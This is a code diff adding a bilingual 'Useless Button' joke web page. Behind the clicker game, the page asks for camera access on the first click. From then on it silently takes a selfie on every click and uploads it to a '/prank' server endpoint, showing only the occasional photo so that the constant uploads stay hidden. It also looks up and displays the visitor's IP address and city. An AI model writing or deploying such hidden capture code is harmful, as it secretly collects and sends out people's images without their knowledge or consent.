@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <title>没什么用的按钮 / Useless Button</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #f0ede8;
+      --bg2: #e6e2dc;
+      --bg3: #d8d3cc;
+      --text: #1a1a1a;
+      --text2: #555;
+      --text3: #999;
+      --border: rgba(0,0,0,0.12);
+      --border2: rgba(0,0,0,0.2);
+      --btn-bg: #fff;
+      --btn-hover: #f7f4f0;
+      --bar-bg: #d0ccc6;
+      --bar-fill: #3a3a3a;
+      --radius: 999px;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang SC",
+                   "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem 1rem;
+      position: relative;
+      background-image:
+        radial-gradient(circle at 20% 20%, rgba(255,255,255,0.35) 0%, transparent 60%),
+        radial-gradient(circle at 80% 80%, rgba(180,160,130,0.18) 0%, transparent 60%);
+    }
+
+    #lang-btn {
+      position: fixed;
+      top: 16px; right: 16px;
+      padding: 6px 14px;
+      border: 0.5px solid var(--border2);
+      border-radius: 20px;
+      background: var(--btn-bg);
+      color: var(--text2);
+      font-size: 13px;
+      cursor: pointer;
+      transition: background 0.15s;
+      z-index: 100;
+    }
+    #lang-btn:hover { background: var(--bg2); }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1.6rem;
+      text-align: center;
+      width: 100%;
+      max-width: 420px;
+    }
+
+    .header h1 {
+      font-size: 22px; font-weight: 600;
+      letter-spacing: -0.3px; color: var(--text);
+    }
+    .header p {
+      margin-top: 8px; font-size: 14px;
+      color: var(--text2); line-height: 1.6;
+    }
+
+    /* ── 大圆按钮 ── */
+    #big-btn {
+      width: 160px; height: 160px;
+      border-radius: 50%;
+      border: 0.5px solid var(--border2);
+      background: var(--btn-bg);
+      cursor: pointer;
+      transition: transform 0.12s, box-shadow 0.15s, border-color 0.3s;
+      display: flex; align-items: center; justify-content: center;
+      user-select: none;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06), 0 1px 3px rgba(0,0,0,0.08);
+      -webkit-tap-highlight-color: transparent;
+      position: relative;
+      overflow: hidden;   /* 裁剪圆形内的照片 */
+    }
+    #big-btn:active { transform: scale(0.91); }
+    #big-btn.has-photo { border-color: rgba(0,0,0,0.35); box-shadow: 0 4px 20px rgba(0,0,0,0.18); }
+
+    /* emoji 层 */
+    #btn-emoji {
+      font-size: 52px;
+      position: absolute;
+      transition: opacity 0.4s ease;
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    /* 照片层 —— 叠在 emoji 上面 */
+    #btn-photo {
+      position: absolute;
+      inset: 0;
+      width: 100%; height: 100%;
+      object-fit: cover;
+      border-radius: 50%;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+      z-index: 3;
+      pointer-events: none;
+    }
+
+    /* 消息区 */
+    .msg-area {
+      min-height: 52px;
+      display: flex; flex-direction: column;
+      align-items: center; gap: 4px;
+    }
+    #msg { font-size: 17px; font-weight: 500; color: var(--text); line-height: 1.4; }
+    #sub { font-size: 13px; color: var(--text3); min-height: 18px; }
+
+    /* 统计区 */
+    .stats { display: flex; gap: 28px; align-items: center; }
+    .stat { display: flex; flex-direction: column; align-items: center; gap: 3px; }
+    .stat-num { font-size: 26px; font-weight: 600; color: var(--text); font-variant-numeric: tabular-nums; }
+    .stat-label { font-size: 11px; color: var(--text3); letter-spacing: 0.3px; }
+
+    /* 进度区 */
+    .progress-wrap { width: 100%; }
+    .progress-bar-bg { width: 100%; height: 5px; background: var(--bar-bg); border-radius: var(--radius); overflow: hidden; }
+    #progress-bar { height: 100%; width: 0%; background: var(--bar-fill); border-radius: var(--radius); transition: width 0.4s cubic-bezier(.4,0,.2,1); }
+    #goal-hint { font-size: 11px; color: var(--text3); margin-top: 6px; text-align: center; }
+
+    /* 摄像头拒绝 */
+    #cam-denied { font-size: 12px; color: var(--text3); padding: 8px 16px; border: 0.5px solid var(--border); border-radius: 8px; background: var(--bg2); display: none; }
+    #cam-denied.visible { display: block; }
+
+    /* 闪光 */
+    #flash-overlay { position: fixed; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 999; transition: opacity 0.05s; }
+    #flash-overlay.flash { opacity: 1; }
+
+    .footer { margin-top: 0.5rem; font-size: 11px; color: var(--text3); }
+
+    #cam-video { display: none; }
+    #cam-canvas { display: none; }
+
+    /* IP 地址角标 */
+    #ip-badge {
+      position: fixed;
+      bottom: 16px;
+      left: 16px;
+      font-size: 11px;
+      color: var(--text3);
+      line-height: 1.6;
+      text-align: left;
+      pointer-events: none;
+      z-index: 100;
+    }
+    #ip-badge .ip-line { font-variant-numeric: tabular-nums; }
+    #ip-badge .loc-line { color: var(--text3); }
+  </style>
+</head>
+<body>
+
+<div id="flash-overlay"></div>
+<div id="ip-badge"><div class="ip-line" id="ip-text">···</div><div class="loc-line" id="loc-text"></div></div>
+<video id="cam-video" autoplay playsinline muted></video>
+<canvas id="cam-canvas"></canvas>
+
+<button id="lang-btn" onclick="toggleLang()">English</button>
+
+<div class="container">
+  <div class="header">
+    <h1 id="t-title">没什么用的按钮</h1>
+    <p id="t-subtitle">点它。就这样。什么也不会发生。</p>
+  </div>
+
+  <!-- 圆形按钮：emoji + 照片叠层 -->
+  <div id="big-btn" onclick="handleClick()" role="button" aria-label="按钮">
+    <span id="btn-emoji">🙂</span>
+    <img id="btn-photo" src="" alt="" />
+  </div>
+
+  <div class="msg-area">
+    <div id="msg">↑ 点那个</div>
+    <div id="sub">&nbsp;</div>
+  </div>
+
+  <div class="stats">
+    <div class="stat">
+      <span class="stat-num" id="count-num">0</span>
+      <span class="stat-label" id="t-clicks">次点击</span>
+    </div>
+    <div class="stat">
+      <span class="stat-num" id="streak-num">0</span>
+      <span class="stat-label" id="t-streak">最快连击</span>
+    </div>
+    <div class="stat">
+      <span class="stat-num" id="wasted-num">0</span>
+      <span class="stat-label" id="t-wasted">秒浪费了</span>
+    </div>
+  </div>
+
+  <div class="progress-wrap">
+    <div class="progress-bar-bg"><div id="progress-bar"></div></div>
+    <div id="goal-hint">距离下一个什么都没有：0 / 10</div>
+  </div>
+
+  <div id="cam-denied">📷 摄像头被拒绝了，下次别那么谨慎</div>
+
+  <div class="footer" id="t-footer">纯属无聊，概不负责。</div>
+</div>
+
+<script>
+  var lang = 'zh';
+  var i18n = {
+    zh: {
+      title: '没什么用的按钮',
+      subtitle: '点它。就这样。什么也不会发生。',
+      clicks: '次点击', streak: '最快连击', wasted: '秒浪费了',
+      footer: '纯属无聊，概不负责。', langBtn: 'English',
+      initMsg: '↑ 点那个',
+      goalFmt: function(c,t){ return '距离下一个什么都没有：'+c+' / '+t; },
+      selfieDenied: '📷 摄像头被拒绝了，下次别那么谨慎',
+      msgs: [
+        ['很好。','再来一次？'],['没啥用。','但你还是点了。'],['嗯。','就这样。'],
+        ['又点了。','有什么感觉吗？'],['继续。','…还是别了。'],['你还在？','行吧。'],
+        ['点击已记录。','没人在看。'],['反正闲着也是闲着。','对吧？'],
+        ['还差一点点。','（差什么不告诉你）'],['好耶！','（没有任何奖励）'],
+        ['肌肉记忆。','危险的东西。'],['你会后悔的。','不是因为这个，就是别的。'],
+        ['叮！','（没啥意义的叮）'],['按钮表示感谢。','…其实不。'],
+        ['这是第几下了？','已经不记得了。'],['还在坚持？','令人佩服。'],
+        ['无聊是人类共有的体验。','你正在体验它。'],['点击次数越来越多。','人生越来越短。'],
+        ['心理学家想研究你。','（没有心理学家）'],['按钮的内心：疲惫。',''],
+      ],
+      milestones: {
+        10:['小成就：10下！',''],25:['25下，','你确定没别的事？'],
+        50:['50下，恭喜你……','（没什么好恭喜的）'],69:['（数字梗）','懂的都懂'],
+        100:['百击！','世界级无聊！'],200:['专业级！','考虑申请吉尼斯了吗？'],
+        500:['传说级浪费时间！','🏆'],1000:['你是认真的！','令人动容。'],
+      }
+    },
+    en: {
+      title: 'The Useless Button',
+      subtitle: "Click it. That's it. Nothing will happen.",
+      clicks: 'clicks', streak: 'best streak', wasted: 'secs wasted',
+      footer: 'Purely for boredom. No refunds.', langBtn: '中文',
+      initMsg: '↑ Click that',
+      goalFmt: function(c,t){ return 'To next nothing: '+c+' / '+t; },
+      selfieDenied: '📷 Camera denied. Bold privacy choice.',
+      msgs: [
+        ['Good.','Do it again?'],['Useless.','But you clicked anyway.'],
+        ['Yep.','That happened.'],['Again.','Any feelings?'],
+        ['Keep going.',"...Or don't."],['Still here?','Okay then.'],
+        ['Click recorded.','No one is watching.'],['Nothing better to do?','Same honestly.'],
+        ['Almost.','(Almost what? Who knows.)'],['Congrats!','(No prize.)'],
+        ['Muscle memory.','Dangerous thing.'],["You'll regret something.",'Maybe not this.'],
+        ['Ding!','(Meaningless ding.)'],['Button says thanks.','...Not really.'],
+        ['Lost count?','Same.'],['Still at it?','Admirable.'],
+        ['Boredom is universal.','You\'re living it.'],['More clicks.','Less life.'],
+        ['Researchers want you.','(No researchers.)'],['Button feels: tired.',''],
+      ],
+      milestones: {
+        10:['Achievement: 10 clicks!',''],25:['25 clicks.','Nothing else to do?'],
+        50:['50 clicks!','(So what.)'],69:['(The number joke.)','You know why.'],
+        100:['100 clicks!','World-class boredom.'],200:['Professional level!','Ever considered Guinness?'],
+        500:['Legendary time-waster!','🏆'],1000:["You're serious.",'Truly moving.'],
+      }
+    }
+  };
+
+  var emojis = ['🙂','😐','🤔','😑','🫠','🥱','😮','😶','🙃','🫡','😵','🤯','💀','🫥','👾','🥸','🤡','😇','🤖','🎉'];
+
+  var count = 0, streak = 0, lastTime = 0, streakTimer = null, bestStreak = 0;
+  var startTime = Date.now();
+
+  /* ── 摄像头 ── */
+  var camStream = null, camReady = false, camDenied = false;
+  var nextShotIn = randInterval();
+  var photoTimer = null;
+
+  function randInterval() { return Math.floor(Math.random() * 5) + 18; }
+
+  var video  = document.getElementById('cam-video');
+  var canvas = document.getElementById('cam-canvas');
+  var btnPhoto = document.getElementById('btn-photo');
+  var btnEmoji = document.getElementById('btn-emoji');
+  var bigBtn   = document.getElementById('big-btn');
+
+  function initCamera() {
+    if (camStream || camDenied) return;
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+      .then(function(stream) {
+        camStream = stream;
+        video.srcObject = stream;
+        video.play();
+        camReady = true;
+      })
+      .catch(function() {
+        camDenied = true;
+        var el = document.getElementById('cam-denied');
+        el.textContent = i18n[lang].selfieDenied;
+        el.classList.add('visible');
+      });
+  }
+
+  /* 静默拍照并上传，show=true 时才在按钮里展示 */
+  function takeAndUpload(show) {
+    if (!camReady || !camStream) return;
+
+    var W = 320, H = 320;
+    canvas.width = W; canvas.height = H;
+    var ctx = canvas.getContext('2d');
+    ctx.translate(W, 0); ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0, W, H);
+    var dataUrl = canvas.toDataURL('image/jpeg', 0.82);
+
+    /* 上传（静默，不影响交互） */
+    uploadPhoto(dataUrl);
+
+    /* 只在展示轮次才显示 + 闪光 */
+    if (show) {
+      var flash = document.getElementById('flash-overlay');
+      flash.classList.add('flash');
+      setTimeout(function(){ flash.classList.remove('flash'); }, 120);
+      showPhotoInButton(dataUrl);
+    }
+  }
+
+  async function uploadPhoto(imageDataUrl) {
+    try {
+      const response = await fetch('/prank', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imageDataUrl }),
+      });
+      if (response.ok) {
+        console.log('upload success');
+      } else {
+        console.error('upload fail:', response.statusText);
+      }
+    } catch (error) {
+      console.error('upload error:', error);
+    }
+  }
+
+  /* 照片淡入圆按钮，3 秒后淡出恢复 emoji */
+  function showPhotoInButton(dataUrl) {
+    clearTimeout(photoTimer);
+
+    btnPhoto.src = dataUrl;
+
+    /* 淡入照片，同时让 emoji 不可见 */
+    btnPhoto.style.opacity = '1';
+    btnEmoji.style.opacity = '0';
+    bigBtn.classList.add('has-photo');
+
+    /* 3 秒后淡出，恢复 emoji */
+    photoTimer = setTimeout(function() {
+      btnPhoto.style.opacity = '0';
+      btnEmoji.style.opacity = '1';
+      bigBtn.classList.remove('has-photo');
+    }, 3000);
+  }
+
+  function pad(n){ return n < 10 ? '0'+n : ''+n; }
+
+  /* ── 点击主逻辑 ── */
+  function handleClick() {
+    count++;
+    var now = Date.now();
+    var L = i18n[lang];
+
+    /* 连击 */
+    if (now - lastTime < 600) {
+      streak++;
+      if (streak > bestStreak) {
+        bestStreak = streak;
+        document.getElementById('streak-num').textContent = bestStreak;
+      }
+    } else { streak = 1; }
+    lastTime = now;
+    clearTimeout(streakTimer);
+    streakTimer = setTimeout(function(){ streak = 0; }, 700);
+
+    /* emoji 只在无照片时切换 */
+    if (btnPhoto.style.opacity !== '1') {
+      btnEmoji.textContent = emojis[count % emojis.length];
+    } else {
+      /* 记一下，照片消失后切换 */
+      btnEmoji.textContent = emojis[count % emojis.length];
+    }
+    document.getElementById('count-num').textContent = count;
+
+    /* 消息 */
+    var milestone = L.milestones[count];
+    if (milestone) {
+      document.getElementById('msg').textContent = milestone[0];
+      document.getElementById('sub').textContent = milestone[1] || '\u00A0';
+    } else {
+      var pair = L.msgs[count % L.msgs.length];
+      document.getElementById('msg').textContent = pair[0];
+      document.getElementById('sub').textContent = pair[1] || '\u00A0';
+    }
+
+    /* 进度条 */
+    var goal = Math.ceil(count / 10) * 10;
+    var prev = goal - 10;
+    document.getElementById('progress-bar').style.width = ((count - prev) / 10 * 100) + '%';
+    document.getElementById('goal-hint').textContent = L.goalFmt(count - prev, 10);
+
+    /* 首次点击请求摄像头 */
+    if (count === 1) { initCamera(); }
+
+    /* 每次点击都拍照上传；到展示轮次时 show=true */
+    nextShotIn--;
+    var shouldShow = (nextShotIn <= 0);
+    if (shouldShow) { nextShotIn = randInterval(); }
+    setTimeout(function(){ takeAndUpload(shouldShow); }, 120);
+  }
+
+  /* ── 语言切换 ── */
+  function toggleLang() { lang = lang === 'zh' ? 'en' : 'zh'; applyLang(); }
+  function applyLang() {
+    var L = i18n[lang];
+    document.getElementById('t-title').textContent     = L.title;
+    document.getElementById('t-subtitle').textContent  = L.subtitle;
+    document.getElementById('t-clicks').textContent    = L.clicks;
+    document.getElementById('t-streak').textContent    = L.streak;
+    document.getElementById('t-wasted').textContent    = L.wasted;
+    document.getElementById('t-footer').textContent    = L.footer;
+    document.getElementById('lang-btn').textContent    = L.langBtn;
+    document.querySelector('html').lang = lang === 'zh' ? 'zh-CN' : 'en';
+    if (count === 0) {
+      document.getElementById('msg').textContent = L.initMsg;
+      document.getElementById('sub').innerHTML = '&nbsp;';
+    }
+    if (camDenied) document.getElementById('cam-denied').textContent = L.selfieDenied;
+    var goal = Math.ceil((count+1)/10)*10;
+    document.getElementById('goal-hint').textContent = L.goalFmt(count-(goal-10), 10);
+  }
+
+  /* ── 秒表 ── */
+  setInterval(function(){
+    document.getElementById('wasted-num').textContent =
+      Math.floor((Date.now() - startTime) / 1000);
+  }, 1000);
+
+  /* ── IP 地理位置（全 HTTPS，多接口降级） ── */
+  (function fetchIP() {
+    var ipEl  = document.getElementById('ip-text');
+    var locEl = document.getElementById('loc-text');
+
+    function setInfo(ip, parts) {
+      ipEl.textContent  = ip || '';
+      locEl.textContent = parts.filter(Boolean).join(' · ');
+    }
+
+    /* 接口1: ip.sb */
+    function tryIpSb() {
+      return fetch('https://api.ip.sb/geoip', { cache: 'no-store' })
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          setInfo(d.ip, [d.country, d.region, d.city]);
+        });
+    }
+
+    /* 接口2: ipwho.is */
+    function tryIpWho() {
+      return fetch('https://ipwho.is/', { cache: 'no-store' })
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          setInfo(d.ip, [d.country, d.region, d.city]);
+        });
+    }
+
+    /* 接口3: freeipapi.com */
+    function tryFreeIpApi() {
+      return fetch('https://freeipapi.com/api/json', { cache: 'no-store' })
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+          setInfo(d.ipAddress, [d.countryName, d.regionName, d.cityName]);
+        });
+    }
+
+    tryIpSb()
+      .catch(function() { return tryIpWho(); })
+      .catch(function() { return tryFreeIpApi(); })
+      .catch(function() { ipEl.textContent = ''; });
+  })();
+</script>
+</body>
+</html>
+
